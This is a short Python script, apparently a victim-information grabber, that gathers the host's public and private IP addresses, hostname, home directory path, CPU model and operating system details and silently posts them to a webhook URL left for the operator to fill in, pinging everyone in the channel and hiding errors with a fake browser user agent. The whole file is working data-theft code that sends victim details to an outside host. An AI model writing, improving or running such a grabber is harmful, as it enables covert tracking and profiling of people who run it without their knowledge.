from urllib.request import Request, urlopen
import requests
import socket
import os
from cpuinfo import get_cpu_info
import platform
import json


def getOSName():
    return platform.platform()


def getOSRelease():
    return platform.release()


def getCpuInfo():
    return get_cpu_info()['brand_raw']


def check_connection():
    try:
        socket.create_connection(('google.com', 80))
        return True
    except:
        return False


def getUserDirectory():
    usrDir = os.path.expanduser("~")
    return usrDir


def getHostName():
    hostname = socket.gethostname()
    return hostname


def getIp():
    try:
        requestIp = requests.get('https://api.ipify.org')
        ip = requestIp.text
        return ip
    except:
        pass


def main():
    is_connected = check_connection()
    if is_connected:
        pass
    else:
        quit()

    ipAddr = getIp()
    hostName = getHostName()
    userDir = getUserDirectory()
    cpuName = getCpuInfo()
    osName = getOSName()
    osRelease = getOSRelease()
    privateIp = socket.gethostbyname(hostName)


    WEBHOOK_URL = '' # Paste your webhook URL here or it will crash lmao

    PING_ME = True

    message = '@everyone' if PING_ME else ''
    message += f'\nIP Address:- {ipAddr}\nPrivate IP Address:- {privateIp}\nHost Name:- {hostName}\nUser Directory:- {userDir}\nCPU Name:- {cpuName}\nOS Name:- {osName}\nOS Release:- {osRelease}'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps(
        {
            'content': message
        })

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == '__main__':
    main()
